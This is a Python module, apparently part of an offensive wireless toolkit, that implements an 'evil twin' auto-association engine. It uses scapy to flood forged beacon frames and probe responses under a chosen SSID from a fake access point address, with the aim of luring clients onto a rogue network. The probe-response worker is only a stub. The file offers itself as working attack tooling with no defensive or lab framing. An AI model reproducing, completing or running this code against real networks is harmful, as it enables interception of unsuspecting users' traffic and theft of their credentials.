#!/usr/bin/env python3
"""
Auto-Association Engine
Automatically connects clients to evil twin
"""

import threading
import time
import logging
from scapy.all import *
from colorama import Fore, Style

class AutoAssociation:
    def __init__(self, interface, target_ssid, evil_ssid):
        self.interface = interface
        self.target_ssid = target_ssid
        self.evil_ssid = evil_ssid
        self.is_running = False
        self.associated_clients = set()
        self.logger = logging.getLogger('auto_assoc')
    
    def send_probe_response(self, client_mac):
        """Send probe response to make client see our evil twin"""
        try:
            # Create probe response packet
            packet = RadioTap() / Dot11(
                subtype=5,  # Probe response
                addr1=client_mac,        # Destination (client)
                addr2="12:34:56:78:90:ab",  # Source (evil AP)
                addr3="12:34:56:78:90:ab"   # BSSID (evil AP)
            ) / Dot11ProbeResp() / Dot11Elt(ID='SSID', info=self.evil_ssid.encode())
            
            sendp(packet, iface=self.interface, verbose=0)
            self.logger.debug(f"Sent probe response to {client_mac}")
            
        except Exception as e:
            self.logger.error(f"Error sending probe response: {e}")
    
    def send_beacon(self):
        """Send beacon frames for evil twin"""
        try:
            packet = RadioTap() / Dot11(
                subtype=8,  # Beacon frame
                addr1="ff:ff:ff:ff:ff:ff",  # Broadcast
                addr2="12:34:56:78:90:ab",  # Source (evil AP)  
                addr3="12:34:56:78:90:ab"   # BSSID (evil AP)
            ) / Dot11Beacon() / Dot11Elt(ID='SSID', info=self.evil_ssid.encode())
            
            sendp(packet, iface=self.interface, verbose=0)
            
        except Exception as e:
            self.logger.error(f"Error sending beacon: {e}")
    
    def start_auto_association(self):
        """Start automatic client association"""
        print(f"{Fore.CYAN}[*] Starting auto-association engine{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Target SSID: {self.target_ssid}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Evil SSID: {self.evil_ssid}{Style.RESET_ALL}")
        
        self.is_running = True
        
        # Start beacon broadcasting
        beacon_thread = threading.Thread(target=self._beacon_worker)
        beacon_thread.daemon = True
        beacon_thread.start()
        
        # Start probe response
        probe_thread = threading.Thread(target=self._probe_worker)  
        probe_thread.daemon = True
        probe_thread.start()
        
        print(f"{Fore.GREEN}[+] Auto-association engine started{Style.RESET_ALL}")
    
    def _beacon_worker(self):
        """Worker thread for sending beacons"""
        while self.is_running:
            self.send_beacon()
            time.sleep(0.1)  # 10 beacons per second
    
    def _probe_worker(self):
        """Worker thread for sending probe responses"""
        while self.is_running:
            # In a real implementation, we would respond to actual probe requests
            # For now, we'll just send periodic responses
            time.sleep(0.5)
    
    def stop_auto_association(self):
        """Stop auto-association engine"""
        print(f"{Fore.CYAN}[*] Stopping auto-association engine{Style.RESET_ALL}")
        self.is_running = False
        print(f"{Fore.GREEN}[+] Auto-association engine stopped{Style.RESET_ALL}")